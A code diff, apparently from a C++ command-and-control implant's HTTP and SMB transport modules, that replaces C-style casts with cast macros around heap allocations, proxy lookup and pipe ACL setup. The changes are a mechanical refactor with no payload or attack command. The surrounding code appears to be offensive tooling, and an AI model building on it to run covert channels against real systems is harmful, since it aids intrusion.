@@ -101,7 +101,7 @@ namespace Http {
 
             if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->Transport.http->Handle, Endpoint, &AutoProxyOptions, &ProxyInfo)) {
                 Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);
-                Ctx->Transport.EnvProxy     = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, (ULONG) NULL, Ctx->Transport.EnvProxyLen);
+                Ctx->Transport.EnvProxy     = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, NULL, Ctx->Transport.EnvProxyLen);
 
                 x_memcpy(Ctx->Transport.EnvProxy, &ProxyInfo, Ctx->Transport.EnvProxyLen);
 
@@ -184,7 +184,7 @@ namespace Http {
 
         } while (Length > 0);
 
-        (*Inbound) = (PSTREAM) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(STREAM));
+        (*Inbound) = PSTREAM_CAST(Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(STREAM)));
         (*Inbound)->Buffer = Download;
         (*Inbound)->Length = Total;
 
@@ -242,7 +242,7 @@ namespace Smb {
 
         access.Trustee.TrusteeForm = TRUSTEE_IS_SID;
         access.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
-        access.Trustee.ptstrName = (PCHAR) SmbSecAttr->Sid;
+        access.Trustee.ptstrName = PCHAR_CAST(SmbSecAttr->Sid);
 
         if (
             !(result = Ctx->win32.SetEntriesInAclA(1, &access, nullptr, &acl)) ||
@@ -250,7 +250,7 @@ namespace Smb {
             return_defer(ERROR_INVALID_SID);
         }
 
-        if (!(SmbSecAttr->pAcl = (PACL) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, MAX_PATH))) {
+        if (!(SmbSecAttr->pAcl = PACL_CAST(Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, MAX_PATH)))) {
             return_defer(ERROR_NOT_ENOUGH_MEMORY);
         }
 
@@ -350,7 +350,7 @@ namespace Smb {
                 return_defer(ERROR_NOT_READY);
             }
 
-            (*Inbound) = (PSTREAM) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(STREAM));
+            (*Inbound) = PSTREAM_CAST(Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(STREAM)));
             (*Inbound)->Buffer = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, MsgSize);
             (*Inbound)->Length = MsgSize;
 
